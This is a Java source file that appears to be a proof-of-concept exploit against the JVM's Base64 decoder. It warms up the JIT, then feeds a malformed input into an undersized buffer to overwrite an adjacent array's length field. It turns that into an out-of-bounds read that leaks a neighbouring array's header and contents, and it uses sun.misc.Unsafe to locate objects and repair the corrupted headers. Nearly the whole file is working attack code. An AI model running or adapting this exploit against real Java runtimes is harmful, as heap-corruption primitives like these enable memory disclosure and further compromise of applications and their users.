import java.lang.reflect.Field;
import java.nio.charset.StandardCharsets;
import java.util.Arrays;
import java.util.Base64;
import sun.misc.Unsafe;

public final class HeapLeak {
    static Unsafe U;
    static volatile byte[] out, writer, leak;
    static volatile long[] canary;
    static volatile Object[] holder;
    static long wMark, lMark;
    static int wKlass, wLen, lKlass, lLen;

    public static void main(String[] a) throws Exception {
        Field f = Unsafe.class.getDeclaredField("theUnsafe");
        f.setAccessible(true);
        U = (Unsafe) f.get(null);

        Base64.Decoder d = Base64.getDecoder();
        byte[] valid = "A".repeat(64).getBytes(StandardCharsets.US_ASCII);
        byte[] bad   = ("A".repeat(64) + "=").getBytes(StandardCharsets.US_ASCII);

        alloc();
        Arrays.fill(canary, 0x4141414142424242L);

        long b = U.ARRAY_BYTE_BASE_OFFSET;
        int o1 = U.getInt(holder, b), o2 = U.getInt(holder, b + 4), o3 = U.getInt(holder, b + 8), o4 = U.getInt(holder, b + 12);
        System.out.printf("out@%08x writer@%08x leak@%08x canary@%08x d=%d,%d,%d%n",
                o1, o2, o3, o4, o2 - o1, o3 - o2, o4 - o3);

        byte[] sink = new byte[128];
        for (int i = 0; i < 200_000; i++) d.decode(valid, out);
        for (int i = 0; i < 200_000; i++) poke(writer, i & 63, (byte) i);
        for (int i = 0; i < 200_000; i++) pull(leak, i & 31, sink, 0);

        wMark = U.getLong(writer, 0L); wKlass = U.getInt(writer, 8L); wLen = U.getInt(writer, 12L);
        lMark = U.getLong(leak, 0L); lKlass = U.getInt(leak, 8L); lLen = U.getInt(leak, 12L);

        try { d.decode(bad, out); } catch (IllegalArgumentException ignored) {}
        System.out.printf("writer len -> %d (unsigned %d)%n", U.getInt(writer, 12L), U.getInt(writer, 12L) & 0xffffffffL);

        try {
            // leak.length = 0x1000 via writer[76..79]
            poke(writer, 76, (byte) 0x00);
            poke(writer, 77, (byte) 0x10);
            poke(writer, 78, (byte) 0x00);
            poke(writer, 79, (byte) 0x00);
            System.out.println("leak.length=" + leak.length);

            pull(leak, 80, sink, 32);   // canary header
            pull(leak, 96, sink, 0);    // canary data
            System.out.println("canary hdr : " + hex(sink, 32, 32));
            System.out.println("canary data: " + hex(sink, 0, 32));
        } catch (Throwable t) {
            System.out.println("threw: " + t);
        }

        System.out.println("canary[0]=" + Long.toHexString(canary[0]));
        System.out.println("leak reveals canary=" + (hex(sink, 0, 32).contains("4141414142424242") ? "YES" : "NO"));

        U.putLong(leak, 0L, lMark); U.putInt(leak, 8L, lKlass); U.putInt(leak, 12L, lLen);
        U.putLong(writer, 0L, wMark); U.putInt(writer, 8L, wKlass); U.putInt(writer, 12L, wLen);
        System.out.println("repaired");
    }

    static void poke(byte[] a, int i, byte v) { a[i] = v; }

    static void pull(byte[] src, int from, byte[] dst, int to) {
        for (int i = 0; i < 32; i++) dst[to + i] = src[from + i];
    }

    static String hex(byte[] b, int off, int n) {
        StringBuilder sb = new StringBuilder();
        for (int i = off; i < off + n; i++) sb.append(String.format("%02x", b[i] & 0xff));
        return sb.toString();
    }

    static void alloc() {
        out = new byte[50];
        writer = new byte[64];
        leak = new byte[64];
        canary = new long[4];
        holder = new Object[]{out, writer, leak, canary};
    }
}
